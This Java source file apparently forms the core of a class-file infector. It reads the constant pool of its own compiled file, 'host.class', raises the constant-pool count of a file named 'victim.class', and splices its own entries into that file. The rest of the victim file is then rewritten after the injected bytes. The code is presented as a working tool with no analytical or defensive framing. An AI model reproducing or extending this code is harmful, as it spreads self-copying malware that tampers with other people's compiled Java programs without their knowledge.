import java.io.*;

public class host {

	public static void main(String argv[]) throws IOException {

		//create instance for host
		RandomAccessFile host   = new RandomAccessFile("host.class","r");

		//the length of the constants_pool in bytes
		int cp_length = 578;
                int fpointer = 10;

		//read in our constant_pool
		host.seek(fpointer);
		byte[] cp_pool = new byte[cp_length];
		host.readFully(cp_pool);

		//create instance for victim
		RandomAccessFile victim = new RandomAccessFile("victim.class","rw");

		//seek to end of constants pool
		//read in const_count
                fpointer = 8;
                victim.seek(fpointer);
                int cp_entries = victim.readUnsignedShort();

		//write new constant_count
		victim.seek(fpointer);
                victim.writeShort(cp_entries+65);

		//seek to the start of the const_pool
		fpointer += 2;
		victim.seek(fpointer);

		//iterate through const_pool
		for (int i = 1; i < cp_entries; i++) {
                        int tag = victim.readUnsignedByte();
                        fpointer++;
                        int skipper = 0;
                        	switch (tag) {
                        	    case 7: 
                        	    case 8: fpointer += 2;
                        	            break;
                        	    case 3:
                        	    case 4:
                        	    case 9:
                        	    case 10:
                        	    case 11:
                        	    case 12: fpointer = fpointer + 4;
                        	             break;
                        	    case 5:
                        	    case 6: fpointer = fpointer + 8;
                        	            i++;
                        	            break;
                        	    case 1: skipper = victim.readUnsignedShort();
                        	            fpointer = fpointer + skipper + 2;
                        	            break;
                        	}
                        victim.seek(fpointer); 
		}

		//save the end of the file
        	int offset = (int)victim.length() - fpointer;
        	byte[] end = new byte[offset];
        	victim.read(end, 0, offset);

		//append our new code to the end of the file
		victim.seek(fpointer);
		victim.write(cp_pool);

		//restore tail of file
		victim.write(end);

		//close files
		victim.close();
		host.close();

	}

}